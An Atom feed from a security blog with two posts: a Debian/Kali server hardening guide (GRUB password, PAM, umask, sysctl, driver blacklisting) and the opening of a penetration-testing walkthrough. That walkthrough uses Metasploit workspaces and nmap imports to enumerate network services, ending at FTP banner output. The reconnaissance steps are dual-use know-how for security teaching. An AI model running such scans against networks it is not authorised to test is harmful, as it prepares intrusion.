<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[tech.bitvijays.com]]></title>
  <link href="http://bitvijays.github.io/atom.xml" rel="self"/>
  <link href="http://bitvijays.github.io/"/>
  <updated>2017-01-26T22:21:21+05:30</updated>
  <id>http://bitvijays.github.io/</id>
  <author>
    <name><![CDATA[Vijay Kumar]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Learning From the Field: Securing Debian]]></title>
    <link href="http://bitvijays.github.io/blog/2016/05/29/learning-from-the-field-securing-debian/"/>
    <updated>2016-05-29T14:51:28+05:30</updated>
    <id>http://bitvijays.github.io/blog/2016/05/29/learning-from-the-field-securing-debian</id>
    <content type="html"><![CDATA[<p>Recently, we got an extra laptop with decent configuration to host as a server. We decided to host Kali-Linux on it and make available multiple vulnerable OS from vulnhub.com on it for practice to our teams.</p>

<p>After installing Kali-Linux and running lynis audit tool, linux hardening index was 55. As we are opening this server to public/ people capable of hacking, we need to make sure our server doesn&rsquo;t get hacked.</p>

<!-- more -->


<p>This source is mainly compiled from <a href="https://www.debian.org/doc/manuals/securing-debian-howto/">Securing Debian Manual</a></p>

<ol>
<li><strong>Set up a GRUB password</strong>: This is mainly done to prevent any unauthorized person to change the grub to get a root shell. Anybody can easily get a root-shell and change your passwords by entering <name-of-your-bootimage> init=/bin/sh at the boot prompt. After changing the passwords and rebooting the system, the person has unlimited root-access and can do anything he/she wants to the system.
<ul>
<li>Generate an encrypted password, open a terminal and run the following command:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grub-mkpasswd-pbkdf2</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grub-mkpasswd-pbkdf2 
</span><span class='line'>Enter password: 
</span><span class='line'>Reenter password: 
</span><span class='line'>PBKDF2 hash of your password is grub.pbkdf2.sha512.10000.A56BEB30E27FE2F7D119E8DEFD6A8049E4300734BB139A5DD08E668BA434792B8AB45A285AC88B95DD16658AC7EC0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span></code></pre></td></tr></table></div></figure></li>
<li>Insert the hash in /etc/grub.d/40_custom
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>set superusers="root"
</span><span class='line'>password_pbkdf2 root grub.pbkdf2.sha512.10000.A56BEB30E27FE2F7D119E8DEFD6A8049E4300734BB139A5DD08E668BA434792B8AB45A285AC88B95DD16658AC7EC0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span><span class='line'>export superusers</span></code></pre></td></tr></table></div></figure></li>
<li>Execute update-grub
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update-grub
</span><span class='line'>Generating grub configuration file ...
</span><span class='line'>Found background image: .background_cache.png
</span><span class='line'>Found linux image: /boot/vmlinuz-4.0.0-kali1-amd64
</span><span class='line'>Found initrd image: /boot/initrd.img-4.0.0-kali1-amd64
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>
</li>
</ul></li>

<li><strong>Providing secure user access</strong>: PAM (Pluggable Authentication Modules) allows system administrators to choose how applications authenticate users: 
<ul>
<br>
<li><strong>Password security in PAM</strong>: Install libpam-passwdqc which is a PAM module for password strength policy enforcement.
<ul>Insert the below line in /etc/pam.d/common-password
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>password requisite           pam_passwdqc.so min=disabled,disabled,8,8,8</span></code></pre></td></tr></table></div></figure>
Format is min=N0,N1,N2,N3,N4        [min=disabled,24,11,8,7]
where
<ul>
<li>N0 is used for passwords consisting of characters from one character class only. The character classes are: digits, lower-case letters, upper-case letters, and other characters. There is also a special class for non-ASCII characters, which could not be classified, but are assumed to be non-digits.</li>
<li>N1 is used for passwords consisting of characters from two character classes that do not meet the requirements for a passphrase.</li>
<li>N2 is used for passphrases. Note that besides meeting this length requirement, a passphrase must also consist of a sufficient number of words.</li>
<li>N3 and N4 are used for passwords consisting of characters from three and four character classes, respectively.</li>
</ul>
</ul></li>
<br>
<li><strong>Control of su in PAM</strong>: If you want to protect su, so that only some people can use it to become root on your system, you need to add a new group "wheel" to your system. Add root and the other users that should be able to su to the root user to this group. This makes sure that only people from the group "wheel" can use su to become root. Other users will not be able to become root. In fact they will get a denied message if they try to become root.<a href="https://wiki.debian.org/WHEEL/PAM">Wheel PAM</a> provides a quick tutorial how to set this up.
<ul>
<li>With root privileges uncomment the following line in /etc/pam.d/su, by removing the leading '#':
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#auth       required pam_wheel.so</span></code></pre></td></tr></table></div></figure>
That's all for the file and no user can execute su anymore. This is the most secure configuration.
</li>
<li>Allow a user to execute su: After having restricted the execution of su, create the group wheel with root privileges:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>groupadd wheel</span></code></pre></td></tr></table></div></figure>
And then add user_name to that group:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>usermod -aG wheel user_name</span></code></pre></td></tr></table></div></figure>
From now user_name can execute su.
</li></ul>
</li>
<br>
<li><strong>Temporary directories in PAM</strong>: Since there have been a number of so called insecure tempfile vulnerabilities, thttpd is one example, the libpam-tmpdir is a good package to install. All you have to do is add the following to /etc/pam.d/common-session:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>session    optional     pam_tmpdir.so</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>Configuration for undefined PAM applications</strong>

Finally, but not least, create /etc/pam.d/other and enter the following lines:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auth     required       pam_securetty.so
</span><span class='line'>   auth     required       pam_unix_auth.so
</span><span class='line'>   auth     required       pam_warn.so
</span><span class='line'>   auth     required       pam_deny.so
</span><span class='line'>   account  required       pam_unix_acct.so
</span><span class='line'>   account  required       pam_warn.so
</span><span class='line'>   account  required       pam_deny.so
</span><span class='line'>   password required       pam_unix_passwd.so
</span><span class='line'>   password required       pam_warn.so
</span><span class='line'>   password required       pam_deny.so
</span><span class='line'>   session  required       pam_unix_session.so
</span><span class='line'>   session  required       pam_warn.so
</span><span class='line'>   session  required       pam_deny.so</span></code></pre></td></tr></table></div></figure>
These lines will provide a good default configuration for all applications that support PAM (access is denied by default).</li>
<br>
<li><strong>Setting users umasks</strong>: Debian's default umask setting is 022 this means that files (and directories) can be read and accessed by the user's group and by any other users in the system. More restrictive umask settings include 027 (no access is allowed to new files for the other group, i.e. to other users in the system) or 077 (no access is allowed to new files to the members the user's group).This change is set by defining a proper umask setting for all users
<ul>
<li>introducing an umask call in the shell configuration files: /etc/profile (source by all Bourne-compatible shells), /etc/csh.cshrc, /etc/csh.login, /etc/zshrc and probably some others (depending on the shells you have installed on your system)</li>
<li>change the UMASK setting in /etc/login.defs, Of all of these the last one that gets loaded by the shell takes precedence. The order is: the default system configuration for the user's shell (i.e. /etc/profile and other system-wide configuration files) and then the user's shell (his ~/.profile, ~/.bash_profile, etc...).</li>
<li>Install libpam-umask package adjusts the users' default umask using PAM. Add the following, after installing the package, to /etc/pam.d/common-session:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>session    optional     pam_umask.so umask=077</span></code></pre></td></tr></table></div></figure></li>
<li>you should consider changing root's default 022 umask (as defined in /root/.bashrc) to a more strict umask. That will prevent the system administrator from inadvertenly dropping sensitive files when working as root to world-readable directories (such as /tmp) and having them available for your average user.
</li>
<li>Limiting access to other user's information: However, users' $HOME directories are created with 0755 permissions (group-readable and world-readable). The group permissions is not an issue since only the user belongs to the group, however the world permissions might (or might not) be an issue depending on your local policy.

You can change this behavior so that user creation provides different $HOME permissions. To change the behavior for new users when they get created, change DIR_MODE in the configuration file /etc/adduser.conf to 0750 (no world-readable access).</li>
</ul></li>
</ul>
</li>
<li><strong>User login actions</strong>: edit /etc/login.defs

The next step is to edit the basic configuration and action upon user login. Note that this file is not part of the PAM configuration, it's a configuration file honored by login and su programs, so it doesn't make sense tuning it for cases where neither of the two programs are at least indirectly called (the getty program which sits on the consoles and offers the initial login prompt does invoke login).
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   FAILLOG_ENAB        yes</span></code></pre></td></tr></table></div></figure>
If you enable this variable, failed logins will be logged. It is important to keep track of them to catch someone who tries a brute force attack.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   LOG_UNKFAIL_ENAB    no</span></code></pre></td></tr></table></div></figure>
If you set this variable to 'yes' it will record unknown usernames if the login failed. It is best if you use 'no' (the default) since, otherwise, user passwords might be inadvertenly logged here (if a user mistypes and they enter their password as the username). If you set it to 'yes', make sure the logs have the proper permissions (640 for example, with an appropriate group setting such as adm).
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   SYSLOG_SU_ENAB      yes</span></code></pre></td></tr></table></div></figure>
This one enables logging of su attempts to syslog. Quite important on serious machines but note that this can create privacy issues as well.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   SYSLOG_SG_ENAB      yes</span></code></pre></td></tr></table></div></figure>
The same as SYSLOG_SU_ENAB but applies to the sg program.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   ENCRYPT_METHOD  SHA512</span></code></pre></td></tr></table></div></figure>
As stated above, encrypted passwords greatly reduce the problem of dictionary attacks, since you can use longer passwords. This definition has to be consistent with the value defined in /etc/pam.d/common-password.</li>
<li><strong>Log files Permissions</strong>: It is not only important to decide how alerts are used, but also who has read/modify access to the log files (if not using a remote loghost. First /var/log/lastlog and /var/log/faillog do not need to be readable by normal users. In the lastlog file you can see who logged in recently, and in the faillog you see a summary of failed logins. The author recommends chmod 660 for both.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   #  find /var/log -type f -exec ls -l {} \; | cut -c 17-35 |sort -u
</span><span class='line'>   (see to what users do files in /var/log belong)
</span><span class='line'>   #  find /var/log -type f -exec ls -l {} \; | cut -c 26-34 |sort -u
</span><span class='line'>   (see to what groups do files in /var/log belong)
</span><span class='line'>   # find /var/log -perm +004
</span><span class='line'>   (files which are readable by any user)
</span><span class='line'>   #  find /var/log \! -group root \! -group adm -exec ls -ld {} \;
</span><span class='line'>   (files which belong to groups not root or adm)</span></code></pre></td></tr></table></div></figure></li>
<li><strong>Few important softwares to be installed</strong>:
<ul>
<li><strong>sysstat</strong>: The sysstat utilities are a collection of performance monitoring tools for Linux. These include sar, sadf, mpstat, iostat, tapestat, pidstat, cifsiostat  and sa tools.</li>
<li><strong>apt-listbugs</strong>: apt-listbugs is a tool which retrieves bug reports from the Debian Bug Tracking System and lists them. Especially, it is intended to be invoked before each installation/upgrade by APT in order to check whether the installation/upgrade is safe.</li>
<li><strong>Debian-goodies</strong>: is a package that includes toolbox-style utilities used to manage Debian and its derivative systems such as Ubuntu, Kali Linux.
<ul>
<li>dglob – Produce a list of package names which match a pattern</li>
<li>dgrep – Search all files in given packages for a regex</li>
<li>dpigs – Display which installed packages taken the most disk space</li>
<li>debget – Obtain a .deb for a package in APT’s database</li>
<li>debmany – Choose manpages of installed or removed packages</li>
<li>checkrestart – Finds and restart processes which are using outdated versions of upgraded files</li>
<li>popbugs – Show a customized release-critical bug report based on packages you use</li>
<li>which-pkg-broke – Catch which package might have broken another</li>
</ul></li>
<li><strong>debscan</strong>: The debsecan program evaluates the security status of a host running the Debian operation system. It reports missing security updates and known vulnerabilities in the programs which are installed on the host.</li>
<li>Install <strong>fail2ban</strong>: Fail2ban scans log files (e.g. /var/log/apache/error_log) and bans IPs that show the malicious signs -- too many password failures, seeking for exploits, etc. Generally Fail2Ban is then used to update firewall rules to reject the IP addresses for a specified amount of time, although any arbitrary other action (e.g. sending an email) could also be configured.
<ul>
Configure 
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-protect-ssh-with-fail2ban-on-debian-7">SSH with fail2ban</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-modsecurity-with-apache-on-ubuntu-14-04-and-debian-8">Modsecurity</a>ModSecurity is a free web application firewall (WAF) that works with Apache, Nginx and IIS. It supports a flexible rule engine to perform simple and complex operations and comes with a Core Rule Set (CRS) which has rules for SQL injection, cross site scripting, Trojans, bad user agents, session hijacking and a lot of other exploits.</li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-tripwire-to-detect-server-intrusions-on-an-ubuntu-vps">Tripwire</a>: Open Source Tripwire® software is a security and data integrity tool useful for monitoring and alerting on specific file change(s) on a range of systems.</li>
</ul></li>
</ul>
</li>
<li></strong>Kernel Hardening: Sysctl Values</strong>:
<ul>
<li><strong>kernel.core_uses_pid</strong> (expected 1): If the /proc/sys/kernel/core_uses_pid file contains the value 0, then a core dump file is simply named core.  If this file contains a nonzero value, then the core dump file includes the process ID in a name of the form core.PID.</li>
<li><strong>kptr_restrict</strong> (expected 1): This toggle indicates whether restrictions are placed on exposing kernel addresses via /proc and other interfaces.
<ul>
<li>When kptr_restrict is set to (0), the default, there are no restrictions.</li>
<li>When kptr_restrict is set to (1), kernel pointers printed using the %pK format specifier will be replaced with 0's unless the user has CAP_SYSLOG and effective user and group ids are equal to the real ids. This is
because %pK checks are done at read() time rather than open() time, so if permissions are elevated between the open() and the read() (e.g via a setuid binary) then %pK will not leak kernel pointers to unprivileged
users. Note, this is a temporary solution only. The correct long-term solution is to do the permission checks at open() time. Consider removing world read permissions from files that use %pK, and using dmesg_restrict
to protect against uses of %pK in dmesg(8) if leaking kernel pointer values to unprivileged users is a concern.</li>
<li>When kptr_restrict is set to (2), kernel pointers printed using %pK will be replaced with 0's regardless of privileges.</li>
</ul></li>
<li><strong>kernel.sysrq</strong> (expected 0): It is a 'magical' key combo you can hit which the kernel will respond to regardless of whatever else it is doing, unless it is completely locked up.
Here is the list of possible values in /proc/sys/kernel/sysrq:
<ul>
<li>   0 - disable sysrq completely</li>
<li>   1 - enable all functions of sysrq</li>
<li>  >1 - bitmask of allowed sysrq functions (see below for detailed function description):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>      2 =   0x2 - enable control of console logging level
</span><span class='line'>      4 =   0x4 - enable control of keyboard (SAK, unraw)
</span><span class='line'>      8 =   0x8 - enable debugging dumps of processes etc.
</span><span class='line'>     16 =  0x10 - enable sync command
</span><span class='line'>     32 =  0x20 - enable remount read-only
</span><span class='line'>     64 =  0x40 - enable signalling of processes (term, kill, oom-kill)
</span><span class='line'>    128 =  0x80 - allow reboot/poweroff
</span><span class='line'>    256 = 0x100 - allow nicing of all RT tasks.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
<li><strong>net.ipv4.conf.all.log_martians</strong> (expected 1) or <strong>net.ipv4.conf.default.log_martians</strong> : Log packets with impossible addresses to kernel log. log_martians for the interface will be enabled if at least one of    conf/{all,interface}/log_martians is set to TRUE, it will be disabled otherwise </li>
<li><strong>net.ipv4.conf.all.rp_filter</strong> (expected 1): rp_filter - INTEGER
<ul>
<li>    0 - No source validation.</li>
<li>    1 - Strict mode as defined in RFC3704 Strict Reverse Path
        Each incoming packet is tested against the FIB and if the interface
        is not the best reverse path the packet check will fail.
        By default failed packets are discarded.</li>
<li>    2 - Loose mode as defined in RFC3704 Loose Reverse Path
        Each incoming packet's source address is also tested against the FIB
        and if the source address is not reachable via any interface
        the packet check will fail.</li>

<li>    Current recommended practice in RFC3704 is to enable strict mode
    to prevent IP spoofing from DDos attacks. If using asymmetric routing
    or other complicated routing, then loose mode is recommended.

    The max value from conf/{all,interface}/rp_filter is used
    when doing source validation on the {interface}.

    Default value is 0. Note that some distributions enable it
    in startup scripts.</li>
</ul></li>
<li><strong>net.ipv4.conf.all.send_redirects</strong> (expected 0): send_redirects - BOOLEAN
    Send redirects, if router.
    send_redirects for the interface will be enabled if at least one of
    conf/{all,interface}/send_redirects is set to TRUE,
    it will be disabled otherwise
    Default: TRUE</li>
<li> <strong>net.ipv4.conf.all.accept_redirects</strong> (expected 0) or <strong>net.ipv6.conf.all.accept_redirects</strong> or <strong>net.ipv4.conf.default.accept_redirects</strong> (expected 0):: Disable acceptance of all ICMP redirected packets on all interfaces. Accept ICMP redirect messages.
    accept_redirects for the interface will be enabled if:
    - both conf/{all,interface}/accept_redirects are TRUE in the case
      forwarding for the interface is enabled
    or
    - at least one of conf/{all,interface}/accept_redirects is TRUE in the
      case forwarding for the interface is disabled
    accept_redirects for the interface will be disabled otherwise
    default TRUE (host)
        FALSE (router)</li>
<li><strong>nnet.ipv4.conf.default.accept_source_route</strong> (expected 0):The accept_source_route option causes network interfaces to accept packets with the Strict Source Route (SSR) or Loose Source Routing (LSR) option set.</li>
<li><strong>net.ipv4.tcp_timestamps</strong> (Expected 0): </li>
</ul>
</li>
<li><strong>Legal Banner</strong>: Add legal banner to:
<ul>
<li>/etc/motd</li>
<li>/etc/issue</li>
<li>/etc/issue.net</li></ul></li>
<li><strong>Harden compilers like restricting access to root user only</strong>: Use grep to found out the compilers installed from the /var/log/lynis.log file.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Found known binary: as (compiler) - /usr/bin/as
</span><span class='line'>Found known binary: g++ (compiler) - /usr/bin/g++
</span><span class='line'>Found known binary: gcc (compiler) - /usr/bin/gcc</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lah /usr/bin/as /usr/bin/g++ /usr/bin/gcc
</span><span class='line'>lrwxrwxrwx 1 root root 19 May 12 20:29 /usr/bin/as -&gt; x86_64-linux-gnu-as
</span><span class='line'>lrwxrwxrwx 1 root root  7 Sep  9  2015 /usr/bin/g++ -&gt; g++-4.9
</span><span class='line'>lrwxrwxrwx 1 root root  7 Sep  9  2015 /usr/bin/gcc -&gt; gcc-4.9</span></code></pre></td></tr></table></div></figure>
Remove permissions of read, write, execute from others:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod o-x /usr/bin/as /usr/bin/g++ /usr/bin/gcc
</span><span class='line'>chmod o-r /usr/bin/as /usr/bin/g++ /usr/bin/gcc
</span><span class='line'>chmod o-w /usr/bin/as /usr/bin/g++ /usr/bin/gcc</span></code></pre></td></tr></table></div></figure></li>
<li>Disable drivers like USB Mass storage / firewire storage (if not used) to prevent unauthorized storage or data-theft.
<ul>
<li>USB Mass storage: Add the below line in /etc/modprobe.d/blacklist-usbstorage
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#Disabling USB Storage
</span><span class='line'>blacklist usb-storage</span></code></pre></td></tr></table></div></figure></li>
<li>Firewire storage: Add the below line in /etc/modprobe.d/blacklist-firewire
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#Disabling Firewire Storage
</span><span class='line'>blacklist firewire_core
</span><span class='line'>blacklist firewire_ohci</span></code></pre></td></tr></table></div></figure></li>
</ul></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From the Field: Basic Network Hygiene]]></title>
    <link href="http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene/"/>
    <updated>2016-03-03T13:47:44+05:30</updated>
    <id>http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene</id>
    <content type="html"><![CDATA[<p>So, by using <strong>intelligence gathering</strong> you have completed the normal scanning and banner grabbing. Yay!!. Now, it&rsquo;s time for some <strong>metasploit-fu</strong> and <strong>nmap-fu</strong>.</p>

<!-- more -->


<p>
So we start with creating a new workspace in the msfconsole for better work.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfconsole -q -- Starts Metasploit Console quietly
</span><span class='line'>workspace -a &lt;Engagement_Name&gt; -- Add a new workspace with the engagement name specified
</span><span class='line'>workspace &lt;Engagement_Name&gt; -- Switch to the new workspace</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s import all the nmap xml file of different network ranges</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db_import /root/Documents/Project_Location/Engagement_Name/Internal/Site_10.*.*.0_*/nmap_scans/Port_Scan/*.xml</span></code></pre></td></tr></table></div></figure>


<p>After all the importing, it&rsquo;s important to check what all services/ports are running to get a feel of different possibilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -c port,name -u -o /tmp/ports 
</span><span class='line'>^ -u is used for only showing ports which are open.</span></code></pre></td></tr></table></div></figure>


<p>This will write a file in /tmp/ports containing the port number and it&rsquo;s name. info could also be used to get more information.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /tmp/ports | cut -d , -f2,3 | sort | uniq | tr -d \" | grep -v -E 'port|tcpwrapped' | sort -n</span></code></pre></td></tr></table></div></figure>


<p>This will provide you the sorted ports running on the network which can be then viewed to probe further.</p>

<p>A sample output is</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>***SNIP**
</span><span class='line'>20,ftp-data
</span><span class='line'>21,ftp
</span><span class='line'>22,ssh
</span><span class='line'>23,landesk-rc
</span><span class='line'>23,telnet
</span><span class='line'>24,priv-mail
</span><span class='line'>25,smtp
</span><span class='line'>25,smtp-proxy
</span><span class='line'>***SNIP**</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s move <strong>port by port</strong> and check what metasploit framework and nmap nse has to offer. By no means, this is a complete list, new ports, metasploit modules, nmap nse will be added as used. This post currently covers the below ports / services.</p>

<ul>
<li>FTP | Port 21</li>
<li>SSH | Port 22</li>
<li>Telnet | Port 23</li>
<li>SMTP | Port 25 and Submission Port 587</li>
<li>DNS | Port 53</li>
<li>Finger | Port 79</li>
<li>HTTP </li>
<li>Kerberos | Port 88</li>
<li>NetBios</li>
<li>POP3 | Port 110</li>
<li>RPCInfo | Port 111</li>
<li>Ident | Port 113</li>
<li>SNMP | Port 161</li>
<li>Check Point FireWall-1 Topology | Port 264 </li>
<li>LDAP | Port 389</li>
<li>SMB | Port 445</li>
<li>rexec | Port 512</li>
<li>rlogin | Port 513</li>
<li>RSH | port 514</li>
<li>AFP | Apple Filing Protocol | Port 548</li>
<li>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</li>
<li>HTTPS | Port 443 and 8443 </li>
<li>RTSP | Port 554 and 8554</li>
<li>Rsync | Port 873</li>
<li>Java RMI | Port 1099</li>
<li>MS-SQL | Port 1433</li>
<li>Oracle | Port 1521</li>
<li>MySQL | Port 3306</li>
<li>ISCSI | Port 3260</li>
<li>Postgresql | Port 5432</li>
<li>VNC | Port 5900</li>
<li>X11 | Port 6000</li>
<li>PJL | Port 9100</li>
<li>Apache Cassandra | Port 9160</li>
<li>Network Data Management Protocol (ndmp) | Port 10000</li>
<li>Memcache | Port 11211</li>
<li>MongoDB | Port 27017 and Port 27018</li>
<li>EthernetIP-TCP-UDP | Port 44818</li>
<li>UDP BACNet | Port 47808</li>
</ul>


<h3>FTP | Port 21</h3>

<p>So, on a network we can find multiple version of ftp servers running. Let&rsquo;s find out by</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -p 21 -c info -o /tmp/ftpinfo
</span><span class='line'>cat /tmp/ftpinfo | cut -d , -f2 | sort | uniq</span></code></pre></td></tr></table></div></figure>


<p>A Sample output is</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"Alfresco Document Management System ftpd"
</span><span class='line'>"D-Link Printer Server ftpd"
</span><span class='line'>"FreeBSD ftpd 6.00LS"
</span><span class='line'>"HP JetDirect ftpd"
</span><span class='line'>"HP LaserJet P4014 printer ftpd"
</span><span class='line'>"Konica Minolta bizhub printer ftpd"
</span><span class='line'>"Microsoft ftpd"
</span><span class='line'>"National Instruments LabVIEW ftpd"
</span><span class='line'>"NetBSD lukemftpd"
</span><span class='line'>"Nortel CES1010E router ftpd"
</span><span class='line'>"oftpd"
</span><span class='line'>"OpenBSD ftpd 6.4 Linux port 0.17"
</span><span class='line'>"PacketShaper ftpd"
</span><span class='line'>"ProFTPD 1.3.3"
</span><span class='line'>"Pure-FTPd"
</span><span class='line'>"Ricoh Aficio MP 2000 printer ftpd 6.15"
</span><span class='line'>"Ricoh Aficio MP 2000 printer ftpd 6.17"
</span><span class='line'>"Ricoh Aficio MP 2352 printer ftpd 10.67"
</span><span class='line'>"Ricoh Aficio MP 4002 printer ftpd 11.103"
</span><span class='line'>"Ricoh Aficio MP W3600 printer ftpd 6.15"
</span><span class='line'>"Ricoh Aficio SP 3500SF printer ftpd 75905e"
</span><span class='line'>"vsftpd"
